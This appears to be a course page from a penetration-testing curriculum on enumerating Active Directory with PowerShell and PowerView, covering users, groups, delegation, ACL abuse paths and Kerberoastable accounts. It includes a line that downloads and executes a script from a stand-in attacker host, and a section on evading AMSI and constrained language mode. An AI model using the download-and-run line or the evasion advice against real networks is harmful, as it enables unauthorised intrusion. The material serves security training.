# PowerShell Enumeration

## Unit 2 - Topic 3 | AD Enumeration

---

## Overview

**PowerShell** provides powerful AD enumeration capabilities through both built-in cmdlets (ActiveDirectory module) and offensive tools like **PowerView**. PowerShell is preferred for Windows environments since it's already trusted and available on every Windows machine.

---

## 1. Built-in AD Module

```powershell
# === ACTIVE DIRECTORY MODULE ===
# Available on DCs and systems with RSAT installed
Import-Module ActiveDirectory

# === DOMAIN INFO ===
Get-ADDomain
Get-ADForest
(Get-ADDomain).DomainSID

# === USERS ===
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount, MemberOf
Get-ADUser -Filter {Description -like "*pass*"} -Properties Description

# === GROUPS ===
Get-ADGroup -Filter * | Select-Object Name, GroupScope
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADGroupMember "Enterprise Admins"
Get-ADGroupMember "Schema Admins"

# === COMPUTERS ===
Get-ADComputer -Filter * -Properties OperatingSystem, OperatingSystemVersion
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties OperatingSystem

# === PASSWORD POLICY ===
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -Filter *

# === TRUSTS ===
Get-ADTrust -Filter *
```

---

## 2. PowerView (Offensive PowerShell)

```powershell
# === LOADING POWERVIEW ===
# Download from: github.com/PowerShellMafia/PowerSploit
Import-Module .\PowerView.ps1

# Or load in memory (bypass):
IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# === DOMAIN ENUMERATION ===
Get-Domain                          # Current domain
Get-DomainController                # Domain controllers
Get-DomainSID                       # Domain SID
Get-DomainPolicy                    # Domain policies
(Get-DomainPolicy).SystemAccess     # Password policy

# === USER ENUMERATION ===
Get-DomainUser                      # All users
Get-DomainUser -AdminCount          # Privileged users
Get-DomainUser -SPN                 # Kerberoastable
Get-DomainUser -PreAuthNotRequired  # ASREProastable
Get-DomainUser -Properties name,description | ? {$_.description -ne $null}

# === GROUP ENUMERATION ===
Get-DomainGroup                     # All groups
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroup -AdminCount         # Protected groups
Find-LocalAdminAccess               # Where am I local admin?

# === COMPUTER ENUMERATION ===
Get-DomainComputer                  # All computers
Get-DomainComputer -Unconstrained   # Unconstrained delegation
Get-DomainComputer -Properties dnshostname,operatingsystem

# === GPO ENUMERATION ===
Get-DomainGPO                       # All GPOs
Get-DomainGPO -ComputerIdentity ws-001
Get-DomainGPOLocalGroup             # GPOs modifying local groups

# === ACL ENUMERATION ===
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl           # Find exploitable ACLs
```

---

## 3. Finding Attack Paths with PowerView

```powershell
# === FIND WHERE I HAVE ACCESS ===
# Where am I local admin?
Find-LocalAdminAccess
# Tests SMB access to all domain computers

# Who is logged in where?
Get-NetLoggedOn -ComputerName srv01
Get-NetSession -ComputerName dc01
# Find where Domain Admins are logged in → target those hosts

# === FIND KERBEROASTABLE ACCOUNTS ===
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
# Then: Invoke-Kerberoast

# === FIND DELEGATION ===
# Unconstrained:
Get-DomainComputer -Unconstrained
# Constrained:
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# === FIND ACL ABUSE PATHS ===
# Who has GenericAll on Domain Admins?
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | \
  ? {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"}

# Find objects where current user has write access:
Find-InterestingDomainAcl -ResolveGUIDs | \
  ? {$_.IdentityReferenceName -match "currentuser"}

# === FIND SHARES ===
Find-DomainShare -CheckShareAccess
# Lists accessible shares across the domain
```

---

## 4. AMSI Bypass and Evasion

```powershell
# === PROBLEM: AMSI Blocks PowerView ===
# Anti-Malware Scan Interface detects malicious scripts

# === BYPASS TECHNIQUES ===
# Method 1: Obfuscation
# Rename functions, variables, strings in PowerView

# Method 2: In-memory loading with bypass
# Various AMSI bypass techniques exist
# (Search current bypass methods — they change frequently)

# Method 3: Use compiled C# alternatives
# SharpView — C# port of PowerView
# No PowerShell = no AMSI
.\SharpView.exe Get-DomainUser -SPN

# Method 4: Use other tools
# ADFind.exe — legitimate sysadmin tool
# CrackMapExec — from Linux
# ldapsearch — from Linux

# === CONSTRAINED LANGUAGE MODE ===
# If PowerShell is restricted:
$ExecutionContext.SessionState.LanguageMode
# If "ConstrainedLanguage" — PowerView won't work
# Use C# tools (SharpView, SharpHound) instead
```

---

## 5. PowerShell One-Liners Reference

```powershell
# Domain Admins:
Get-ADGroupMember "Domain Admins" | select name

# Kerberoastable:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Computers with old OS:
Get-ADComputer -Filter * -Properties OperatingSystem | ? {$_.OperatingSystem -like "*2008*" -or $_.OperatingSystem -like "*2003*" -or $_.OperatingSystem -like "*XP*"}

# Users who haven't logged in 90 days:
$date = (Get-Date).AddDays(-90); Get-ADUser -Filter {LastLogonDate -lt $date} -Properties LastLogonDate | select name, lastlogondate

# Password never expires:
Get-ADUser -Filter {PasswordNeverExpires -eq $true} | select name

# Password not required:
Get-ADUser -Filter {PasswordNotRequired -eq $true} | select name
```

---

## Summary Table

| Tool | Type | Advantage |
|------|------|-----------|
| **AD Module** | Built-in | No download needed, trusted |
| **PowerView** | Offensive | Comprehensive, attack-focused |
| **SharpView** | C# | Bypasses AMSI/CLM |
| **ADFind** | CLI | Fast, legitimate admin tool |

---

## Quick Revision Questions

1. **What is the difference between PowerView and the AD module?**
2. **How do you find Kerberoastable accounts with PowerView?**
3. **What is AMSI and how does it affect PowerView?**
4. **How do you find where you have local admin access?**
5. **What alternative tools work when PowerShell is restricted?**

---

[← Previous: LDAP Queries](02-ldap-queries.md) | [Next: BloodHound Basics →](04-bloodhound-basics.md)

---

*Unit 2 - Topic 3 of 6 | [Back to README](../README.md)*
